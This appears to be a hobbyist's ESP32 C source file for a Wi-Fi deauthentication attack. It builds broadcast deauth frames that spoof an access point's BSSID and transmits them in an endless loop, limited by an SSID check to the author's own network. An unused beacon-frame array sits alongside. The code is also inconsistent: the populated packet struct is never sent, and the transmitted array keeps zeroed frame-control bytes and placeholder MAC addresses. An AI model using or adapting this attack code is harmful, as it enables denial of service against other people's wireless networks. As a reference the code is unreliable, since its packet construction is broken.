#include "deauth.h"

void sendDeauthPacket(wifi_ap_record_t rec)
{
    // testing only on my local network.
    if(strcmp((char*)rec.ssid, "dima570") != 0){
        return;
    }

    const char* ATTACK_TAG = "DEAUTH ATTACK";
    ESP_LOGI(ATTACK_TAG,"%s\n", rec.ssid);

    dauthPacket pkt = {
        .frame_control = 0xC000,
        .duration = 0x013A,
        .fragment_and_seq = 0x0000,
        .rescode = 0x0001,
    };

    pkt.targetMac[0] = 0xFF;
    pkt.targetMac[1] = 0xFF; 
    pkt.targetMac[2] = 0xFF;
    pkt.targetMac[3] = 0xFF;
    pkt.targetMac[4] = 0xFF;
    pkt.targetMac[5] = 0xFF;

    pkt.sourceMac[0] = rec.bssid[0];
    pkt.sourceMac[1] = rec.bssid[1];
    pkt.sourceMac[2] = rec.bssid[2];
    pkt.sourceMac[3] = rec.bssid[3];
    pkt.sourceMac[4] = rec.bssid[4];
    pkt.sourceMac[5] = rec.bssid[5];

    pkt.bssid[0] = rec.bssid[0];
    pkt.bssid[1] = rec.bssid[1];
    pkt.bssid[2] = rec.bssid[2];
    pkt.bssid[3] = rec.bssid[3];
    pkt.bssid[4] = rec.bssid[4];
    pkt.bssid[5] = rec.bssid[5];

    // FRAME COTNROL UNSEPORTED PRBLEMS.
    uint8_t deauthPacket[26] = {
    /*  0 - 1  */ 0x00, 0x00,                        // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
    };

    // BEACON PACKET - WORKS
    uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 
            /*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
            /*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
            /*16*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
            /*22*/  0xc0, 0x6c, 
            /*24*/  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 
            /*32*/  0x64, 0x00, 
            /*34*/  0x01, 0x04, 
            /* SSID */
            /*36*/  0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
                    0x01, 0x08, 0x82, 0x84,
                    0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 
            /*56*/  0x04};

    while(true){
        ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, &deauthPacket, sizeof(deauthPacket), false));
        vTaskDelay(200 / portTICK_PERIOD_MS);
    }
}

void setUp(){
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA)); 
    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));
    ESP_ERROR_CHECK(esp_wifi_start());

    esp_wifi_set_promiscuous(true);
    //vTaskDelay(500 / portTICK_PERIOD_MS);
}